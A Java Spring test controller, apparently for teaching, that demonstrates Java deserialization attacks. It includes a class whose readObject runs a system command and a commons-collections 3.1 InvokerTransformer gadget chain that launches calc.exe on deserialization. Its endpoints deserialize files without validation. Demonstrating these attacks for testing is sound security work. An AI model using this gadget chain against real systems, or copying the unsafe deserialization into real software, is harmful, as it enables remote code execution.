package cn.moonlord.test;

import io.swagger.annotations.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import org.springframework.web.bind.annotation.*;

import java.io.*;
import java.util.*;

@Api(tags = "反序列化 测试")
@RestController
@RequestMapping("/Deserialization")
public class DeserializationTestController {

    private static class SimpleObject implements Serializable {
        public String name;
        public SimpleObject(String name) { this.name = name; }
        public String toString(){ return "{\"name\":\"" + name + "\"}"; }
    }

    private static class AttackObject extends SimpleObject implements Serializable {
        public AttackObject(String name) { super(name); }
        private void readObject(ObjectInputStream in) throws Exception {
            in.defaultReadObject();
            Runtime.getRuntime().exec("mspaint.exe");
        }
    }

    private static class HideAttackObject extends SimpleObject implements Serializable {
        public Map map;
        public HideAttackObject(String name, Map map) {
            super(name);
            this.map = map;
        }
        private void readObject(ObjectInputStream in) throws Exception {
            in.defaultReadObject();
            if(map != null && map.size() > 0){
                Map.Entry e = (Map.Entry)map.entrySet().iterator().next();
                e.setValue(name);
            }
        }
    }

    private static final String testCaseA1 = "Hello World";

    @ApiOperation(value="测试用例 A1，序列化一个对象，并保存到 A1.ser 文件中")
    @ApiImplicitParams({@ApiImplicitParam(name = "name", value = "对象参数1", example = testCaseA1)})
    @GetMapping(value = "/TestA1")
    public String TestA1(@RequestParam String name) throws Exception {
        String fileName = "A1.ser";
        SimpleObject obj = new SimpleObject(name);
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(fileName));
        out.writeObject(obj);
        out.close();
        System.out.println("Serialized data is saved in " + fileName);
        return "Serialized data is saved in " + fileName;
    }

    @ApiOperation(value="测试用例 A2，从文件 A1.ser 中，反序列化对象")
    @GetMapping(value = "/TestA2")
    public String TestA2() throws Exception {
        String fileName = "A1.ser";
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(fileName));
        SimpleObject obj = (SimpleObject) in.readObject();
        in.close();
        System.out.println("Serialized Object has been read : " + obj);
        return "Serialized Object has been read : " + obj;
    }

    @ApiOperation(value="测试用例 B1，序列化一个实现了 readObject 的攻击对象，并保存到 B1.ser 文件中")
    @ApiImplicitParams({@ApiImplicitParam(name = "name", value = "对象参数1", example = testCaseA1)})
    @GetMapping(value = "/TestB1")
    public String TestB1(@RequestParam String name) throws Exception {
        AttackObject obj = new AttackObject(name);
        String fileName = "B1.ser";
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(fileName));
        out.writeObject(obj);
        out.close();
        System.out.println("Serialized data is saved in " + fileName);
        return "Serialized data is saved in " + fileName;
    }

    @ApiOperation(value="测试用例 B2，从文件 B1.ser 中，反序列化对象，可以执行攻击代码")
    @GetMapping(value = "/TestB2")
    public String TestB2() throws Exception {
        String fileName = "B1.ser";
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(fileName));
        SimpleObject obj = (SimpleObject) in.readObject();
        in.close();
        System.out.println("Serialized Object has been read : " + obj);
        return "Serialized Object has been read : " + obj;
    }

    @ApiOperation(value="测试用例 C1，使用 commons-collections 3.1 的 InvokerTransformer，序列化攻击对象，并保存到 C1.ser 文件中")
    @ApiImplicitParams({@ApiImplicitParam(name = "name", value = "对象参数1", example = testCaseA1)})
    @GetMapping(value = "/TestC1")
    public String TestC1(@RequestParam String name) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke",
                        new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}
                ),
                new InvokerTransformer("exec",
                        new Class[] {String.class }, new Object[] {"calc.exe"}
                )
        };
        Transformer transformedChain = new ChainedTransformer(transformers);
        Map<String,String> beforeTransformerMap = new HashMap<String,String>();
        beforeTransformerMap.put("testKey", "testValue");
        Map afterTransformerMap = TransformedMap.decorate(beforeTransformerMap, null, transformedChain);
        HideAttackObject obj = new HideAttackObject(name, afterTransformerMap);
        String fileName = "C1.ser";
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(fileName));
        out.writeObject(obj);
        out.close();
        System.out.println("Serialized data is saved in " + fileName);
        return "Serialized data is saved in " + fileName;
    }

    @ApiOperation(value="测试用例 C2，从文件 C1.ser 中，反序列化对象，可以执行攻击代码")
    @GetMapping(value = "/TestC2")
    public String TestC2() throws Exception {
        String fileName = "C1.ser";
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(fileName));
        SimpleObject obj = (SimpleObject) in.readObject();
        in.close();
        System.out.println("Serialized Object has been read : " + obj);
        return "Serialized Object has been read : " + obj;
    }

}
